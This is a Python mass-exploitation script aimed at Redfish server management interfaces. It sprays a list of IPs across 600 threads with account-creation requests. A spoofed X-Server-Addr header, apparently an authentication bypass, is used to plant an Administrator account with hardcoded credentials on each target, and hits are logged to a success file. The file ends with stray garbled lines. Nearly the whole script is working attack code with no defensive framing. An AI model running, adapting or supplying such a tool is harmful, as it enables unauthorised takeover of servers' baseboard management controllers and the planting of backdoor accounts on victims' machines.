import json
import requests
import sys
from concurrent.futures import ThreadPoolExecutor
import warnings

# Configuration
THREAD_COUNT = 600
IPS_FILE = "ips.txt"
RESPONSE_LOG = "response.log"
SUCCESS_LOG = "s.log"
TIMEOUT = 3  # seconds

# Sample payload for POST request
payload = {
    'Name': 'lan test',
    'Description': 'lan test',
    'Enabled': True,
    'Password': 'darshv12',
    'UserName': 'dp1',
    'RoleId': 'Administrator',
    'Locked': False,
    'PasswordChangeRequired': False
}

# Suppress SSL warnings
warnings.filterwarnings('ignore', message='Unverified HTTPS request')

def try_create_account(url, header):
    try:
        response = requests.post(
            f'{url}/redfish/v1/AccountService/Accounts',
            json=payload,
            verify=False,
            headers=header,
            timeout=TIMEOUT
        )

        # Log all responses to response.log
        response_info = {
            'url': url,
            'header': header,
            'status_code': response.status_code,
            'response_text': response.text
        }
        with open(RESPONSE_LOG, 'a') as log_file:
            log_file.write(json.dumps(response_info) + '\n')

        try:
            response_json = response.json()
        except json.JSONDecodeError:
            response_json = {}

        if response_json.get("UserName", "NO") != "NO":
            result = f"Success - URL: {url}, Login: {response_json['UserName']}, Password: {payload['Password']}\n"
            with open(SUCCESS_LOG, 'a') as log_file:
                log_file.write(result)
            return result
        return None
    except requests.RequestException as e:
        # Log failed requests to response.log
        response_info = {
            'url': url,
            'header': header,
            'error': str(e)
        }
        with open(RESPONSE_LOG, 'a') as log_file:
            log_file.write(json.dumps(response_info) + '\n')
        return None

def process_ip(ip):
    if ip[-1] == '/':
        ip = ip[:-1]
    if not ip.startswith(('http://', 'https://')):
        ip = f'https://{ip}'
    
    headers = [
        {'X-Server-Addr': '169.254.0.17:'},
        {'X-Server-Addr': '127.0.0.1:'},
        {'X-Server-Addr': '192.168.31.2:'}
    ]
    
    for header in headers:
        result = try_create_account(ip, header)
        if result:
            print(result.strip())
            return

def main():
    if len(sys.argv) < 2:
        print(f"Example: python3 {sys.argv[0]} {IPS_FILE}")
        sys.exit(1)

    ip_file = sys.argv[1]
    
    try:
        with open(ip_file, 'r') as f:
            # Read IPs and remove duplicates using set
            ips = list(set(line.strip() for line in f if line.strip()))
    except FileNotFoundError:
        print(f"Error: {ip_file} not found")
        sys.exit(1)

    if not ips:
        print("Error: No valid IPs found in the file")
        sys.exit(1)

    print(f"Processing {len(ips)} unique IPs with {THREAD_COUNT} threads (duplicates removed)...")
    
    # Process unique IPs concurrently with THREAD_COUNT threads
    with ThreadPoolExecutor(max_workers=THREAD_COUNT) as executor:
        executor.map(process_ip, ips)

    print(f"Finished processing all unique IPs. Check {SUCCESS_LOG} for successful results and {RESPONSE_LOG} for all responses.")

if __name__ == "__main__":
    main()
n()
n()
